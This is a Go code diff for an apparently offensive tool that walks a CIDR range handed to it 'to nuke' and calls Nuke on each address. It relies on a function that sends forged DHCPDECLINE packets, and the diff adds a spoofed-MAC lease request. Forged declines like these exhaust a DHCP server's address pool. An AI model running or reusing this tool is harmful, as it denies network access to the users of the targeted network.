@@ -10,6 +10,8 @@ import (
 	"os"
 )
 
+const MAC = "08-00-27-00-A8-E8"
+
 func main() {
 	if len(os.Args) == 1 {
 		log.Fatalln("You didn't gave to me an ip range in CIDR notation. DUSHBAG!")
@@ -18,11 +20,14 @@ func main() {
 	toNuke := os.Args[1]
 
 	ip, ipnet, err := net.ParseCIDR(toNuke)
+	// We are not really going to use it, just to keep some numeration
 	if err != nil {
 		log.Fatal(err)
 	}
 	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
 		log.Println(ip)
+		// ip := RequestIP()
+		//ip  = net.ParseIP(ip)
 		Nuke(ip)
 	}
 }
@@ -86,4 +91,47 @@ func SendDHCPDeclinePacket(c *dhcp4client.Client, hw net.HardwareAddr, ip net.IP
 	DeclinePacket.PadToMinSize()
 
 	return DeclinePacket, c.SendPacket(DeclinePacket)
+}
+
+func RequestIP() string {
+
+	var err error
+
+	m, err := net.ParseMAC("08-00-27-00-A8-E8")
+	if err != nil {
+		log.Printf("MAC Error:%v\n", err)
+	}
+
+	//Create a connection to use
+	//We need to set the connection ports to 1068 and 1067 so we don't need root access
+	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: net.IPv4bcast, Port: 67}))
+	if err != nil {
+		log.Fatalln("Client Conection Generation:" + err.Error())
+	}
+
+	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c))
+	if err != nil {
+		log.Fatalf("Error:%v\n", err)
+	}
+
+	success, acknowledgementpacket, err := exampleClient.Request()
+
+	log.Println("Success:%v\n", success)
+	log.Println("Packet:%v\n", acknowledgementpacket)
+
+	if err != nil {
+		networkError, ok := err.(*net.OpError)
+		if ok && networkError.Timeout() {
+			log.Println("Test Skipping as it didn't find a DHCP Server")
+		}
+		log.Println("Error:%v\n", err)
+	}
+
+	if !success {
+		log.Fatalln("We didn't sucessfully get a DHCP Lease?")
+	} else {
+		log.Printf("IP Received:%v\n", acknowledgementpacket.YIAddr().String())
+		return acknowledgementpacket.YIAddr().String()
+	}
+	return ""
 }
